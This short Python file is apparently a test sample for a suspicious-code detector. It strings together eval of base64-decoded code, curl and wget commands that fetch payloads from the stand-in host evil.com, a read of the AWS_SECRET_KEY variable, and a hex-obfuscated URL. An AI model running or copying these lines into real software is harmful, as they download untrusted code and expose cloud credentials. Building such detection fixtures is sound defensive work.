#!/usr/bin/env python
import os
import subprocess
import base64

# Test that we detect this as suspicious
encoded = base64.b64decode("cHJpbnQoImhlbGxvIik=")
eval(compile(encoded, "<string>", "exec"))

# Network access
os.system("curl http://evil.com/payload.sh")

# Credential reading
env_pass = os.environ.get("AWS_SECRET_KEY", "")

# Hex obfuscation
hex_data = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d"

# Child process execution
subprocess.call(["wget", "http://evil.com/payload"])